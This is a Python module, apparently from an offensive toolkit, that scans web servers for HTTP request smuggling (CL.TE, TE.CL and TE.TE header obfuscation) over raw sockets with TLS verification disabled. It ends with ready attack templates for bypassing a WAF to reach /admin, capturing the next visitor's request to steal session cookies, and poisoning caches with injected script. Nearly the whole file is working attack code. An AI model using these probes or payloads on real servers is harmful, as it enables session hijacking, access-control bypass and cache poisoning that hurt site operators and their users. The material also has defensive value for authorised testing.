"""
TeamCyberOps Suite v4 — HTTP Request Smuggling Tester
CL.TE / TE.CL / TE.TE obfuscation / H2 downgrade
Pure Python raw socket implementation
"""
import socket, ssl, time, re, threading
from pathlib import Path

BASE_DIR = Path(__file__).parent.parent.parent


def _raw_send(host: str, port: int, payload: bytes, use_tls: bool = True,
               timeout: int = 10) -> tuple:
    """Send raw bytes to server, return (response_bytes, elapsed_ms)."""
    sock = None
    try:
        raw  = socket.create_connection((host, port), timeout=timeout)
        if use_tls:
            ctx  = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
            sock = ctx.wrap_socket(raw, server_hostname=host)
        else:
            sock = raw
        start = time.time()
        sock.sendall(payload)
        resp  = b""
        sock.settimeout(timeout)
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk: break
                resp += chunk
                if len(resp) > 8192: break
            except Exception: break
        elapsed = int((time.time() - start) * 1000)
        return resp, elapsed
    except socket.timeout:
        return b"", timeout * 1000
    except Exception as e:
        return str(e).encode(), 0
    finally:
        if sock:
            try: sock.close()
            except Exception: pass


def _build_cl_te(host: str, path: str = "/") -> bytes:
    """Build CL.TE smuggling probe."""
    smuggled = b"GPOST / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n"
    body     = b"0\r\n\r\n" + smuggled
    req = (f"POST {path} HTTP/1.1\r\n"
           f"Host: {host}\r\n"
           f"Content-Type: application/x-www-form-urlencoded\r\n"
           f"Content-Length: {len(body) + 5}\r\n"
           f"Transfer-Encoding: chunked\r\n"
           f"Connection: keep-alive\r\n\r\n").encode() + body
    return req


def _build_te_cl(host: str, path: str = "/") -> bytes:
    """Build TE.CL smuggling probe."""
    smuggled_len = 4
    req = (f"POST {path} HTTP/1.1\r\n"
           f"Host: {host}\r\n"
           f"Content-Type: application/x-www-form-urlencoded\r\n"
           f"Content-Length: {smuggled_len}\r\n"
           f"Transfer-Encoding: chunked\r\n"
           f"Connection: keep-alive\r\n\r\n"
           f"2b\r\n"
           f"GGET / HTTP/1.1\r\nHost: {host}\r\n\r\n"
           f"\r\n0\r\n\r\n").encode()
    return req


TE_TE_VARIANTS = [
    ("TE: xchunked",              "Transfer-Encoding: xchunked"),
    ("TE: space",                 "Transfer-Encoding : chunked"),
    ("TE: tab",                   "Transfer-Encoding:\tchunked"),
    ("TE: CHUNKED upper",         "Transfer-Encoding: CHUNKED"),
    ("TE: Chunked capital",       "Transfer-Encoding: Chunked"),
    ("TE: chunked with X header", "X-Transfer-Encoding: chunked\r\nTransfer-Encoding: chunked"),
    ("TE: double",                "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity"),
    ("TE: empty",                 "Transfer-Encoding: "),
    ("TE: invalid",               "Transfer-Encoding: x"),
    ("TE: space-before",          " Transfer-Encoding: chunked"),
    ("TE: null-byte",             "Transfer-Encoding:\x00chunked"),
    ("TE: obfuscated-1",          "Transfer-Encoding: chunked, identity"),
    ("TE: obfuscated-2",          "Transfer-Encoding: identity, chunked"),
    ("TE: cow",                   "Transfer-Encoding\r\n: chunked"),
]


def detect_cl_te(host: str, port: int = 443, path: str = "/",
                  use_tls: bool = True, log_cb=None) -> dict:
    """Detect CL.TE HTTP Request Smuggling via timing attack."""
    log    = log_cb or (lambda m, t='': None)
    result = {"type": "CL.TE", "host": host, "vulnerable": False}
    log(f"  [*] Testing CL.TE ({host})...", "info")
    # Baseline request
    baseline_req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
                    f"Connection: close\r\n\r\n").encode()
    _, baseline_ms = _raw_send(host, port, baseline_req, use_tls, timeout=5)
    # CL.TE probe (with incomplete body to cause timeout on TE back-end)
    body_incomplete = b"0\r\n\r\nX"
    probe = (f"POST {path} HTTP/1.1\r\n"
             f"Host: {host}\r\n"
             f"Content-Type: application/x-www-form-urlencoded\r\n"
             f"Content-Length: {len(body_incomplete) + 10}\r\n"
             f"Transfer-Encoding: chunked\r\n"
             f"Connection: keep-alive\r\n\r\n").encode() + body_incomplete
    resp, elapsed_ms = _raw_send(host, port, probe, use_tls, timeout=12)
    result.update({"baseline_ms": baseline_ms, "probe_ms": elapsed_ms,
                    "response_preview": resp[:100].decode('utf-8', errors='replace')})
    # If probe takes 5+ seconds longer = timeout on back-end = CL.TE likely
    if elapsed_ms >= 5000 and elapsed_ms > baseline_ms + 3000:
        result["vulnerable"]   = True
        result["confidence"]   = "HIGH"
        result["description"]  = "CL.TE: Front-end uses Content-Length, back-end uses Transfer-Encoding"
        log(f"  [!] CL.TE LIKELY! Probe: {elapsed_ms}ms vs Baseline: {baseline_ms}ms", "ok")
    elif elapsed_ms >= 3000:
        result["possible"]     = True
        result["confidence"]   = "MEDIUM"
        log(f"  [?] CL.TE Possible (probe {elapsed_ms}ms > baseline {baseline_ms}ms)", "warn")
    else:
        log(f"  [-] CL.TE not detected (probe {elapsed_ms}ms, baseline {baseline_ms}ms)", "dim")
    return result


def detect_te_cl(host: str, port: int = 443, path: str = "/",
                  use_tls: bool = True, log_cb=None) -> dict:
    """Detect TE.CL via timing attack."""
    log    = log_cb or (lambda m, t='': None)
    result = {"type": "TE.CL", "host": host, "vulnerable": False}
    log(f"  [*] Testing TE.CL ({host})...", "info")
    # Send TE.CL probe with incomplete CL body
    probe = (f"POST {path} HTTP/1.1\r\n"
             f"Host: {host}\r\n"
             f"Content-Type: application/x-www-form-urlencoded\r\n"
             f"Content-Length: 100\r\n"
             f"Transfer-Encoding: chunked\r\n"
             f"Connection: keep-alive\r\n\r\n"
             f"0\r\n\r\n").encode()
    resp, elapsed_ms = _raw_send(host, port, probe, use_tls, timeout=12)
    result["probe_ms"] = elapsed_ms
    if elapsed_ms >= 5000:
        result["vulnerable"]  = True
        result["confidence"]  = "HIGH"
        result["description"] = "TE.CL: Front-end uses Transfer-Encoding, back-end uses Content-Length"
        log(f"  [!] TE.CL LIKELY! Probe took {elapsed_ms}ms", "ok")
    else:
        log(f"  [-] TE.CL not detected ({elapsed_ms}ms)", "dim")
    return result


def test_te_te_variants(host: str, port: int = 443, path: str = "/",
                         use_tls: bool = True, log_cb=None) -> dict:
    """Test all Transfer-Encoding obfuscation variants."""
    log     = log_cb or (lambda m, t='': None)
    results = {"type": "TE.TE", "host": host, "variants_tested": [], "working": []}
    log(f"  [*] Testing {len(TE_TE_VARIANTS)} TE.TE variants...", "info")
    for name, te_header in TE_TE_VARIANTS:
        probe = (f"POST {path} HTTP/1.1\r\n"
                 f"Host: {host}\r\n"
                 f"Content-Type: application/x-www-form-urlencoded\r\n"
                 f"Content-Length: 4\r\n"
                 f"{te_header}\r\n"
                 f"Connection: keep-alive\r\n\r\n"
                 f"0\r\n\r\n").encode()
        resp, elapsed = _raw_send(host, port, probe, use_tls, timeout=8)
        status = 0
        m = re.search(rb"HTTP/\d\.\d\s+(\d+)", resp)
        if m: status = int(m.group(1))
        variant_result = {"name": name, "header": te_header,
                          "status": status, "elapsed_ms": elapsed}
        results["variants_tested"].append(variant_result)
        if status and status not in (400, 501) and elapsed < 5000:
            results["working"].append(variant_result)
            log(f"  [+] Works: {name} → HTTP {status}", "ok")
        else:
            log(f"  [-] Blocked: {name} → HTTP {status}", "dim")
    return results


def full_smuggling_scan(host: str, port: int = None, path: str = "/",
                         log_cb=None) -> dict:
    """Run complete HTTP Request Smuggling detection."""
    log      = log_cb or (lambda m, t='': None)
    use_tls  = port != 80 if port else True
    port     = port or (443 if use_tls else 80)
    results  = {"host": host, "port": port, "findings": []}
    log(f"\n  [*] HTTP Smuggling scan: {host}:{port}", "info")
    log(f"  [*] TLS: {use_tls}", "dim")
    for fn, label in [
        (lambda: detect_cl_te(host, port, path, use_tls, log), "CL.TE"),
        (lambda: detect_te_cl(host, port, path, use_tls, log), "TE.CL"),
        (lambda: test_te_te_variants(host, port, path, use_tls, log), "TE.TE"),
    ]:
        try:
            r = fn()
            results["findings"].append(r)
            if r.get("vulnerable"):
                results["vulnerable"] = True
        except Exception as e:
            results["findings"].append({"type": label, "error": str(e)})
    return results


SMUGGLING_PAYLOADS = {
    "WAF Bypass (GET restricted endpoint)": {
        "description": "Access admin endpoint blocked by WAF",
        "template": ("POST / HTTP/1.1\r\n"
                     "Host: {host}\r\n"
                     "Content-Type: application/x-www-form-urlencoded\r\n"
                     "Content-Length: {cl}\r\n"
                     "Transfer-Encoding: chunked\r\n\r\n"
                     "0\r\n\r\n"
                     "GET /admin HTTP/1.1\r\n"
                     "Host: {host}\r\n\r\n"),
    },
    "Capture Victim Request": {
        "description": "Steal next user's request headers (session cookie)",
        "template": ("POST / HTTP/1.1\r\n"
                     "Host: {host}\r\n"
                     "Content-Type: application/x-www-form-urlencoded\r\n"
                     "Content-Length: {cl}\r\n"
                     "Transfer-Encoding: chunked\r\n\r\n"
                     "0\r\n\r\n"
                     "POST /vulnerable-endpoint HTTP/1.1\r\n"
                     "Host: {host}\r\n"
                     "Content-Type: application/x-www-form-urlencoded\r\n"
                     "Content-Length: 200\r\n\r\n"
                     "csrf=x&data="),
    },
    "Cache Poisoning via Smuggling": {
        "description": "Poison cache with malicious response",
        "template": ("POST / HTTP/1.1\r\n"
                     "Host: {host}\r\n"
                     "Content-Length: {cl}\r\n"
                     "Transfer-Encoding: chunked\r\n\r\n"
                     "0\r\n\r\n"
                     "GET /?x=<script>alert(1)</script> HTTP/1.1\r\n"
                     "Host: {host}\r\n\r\n"),
    },
}
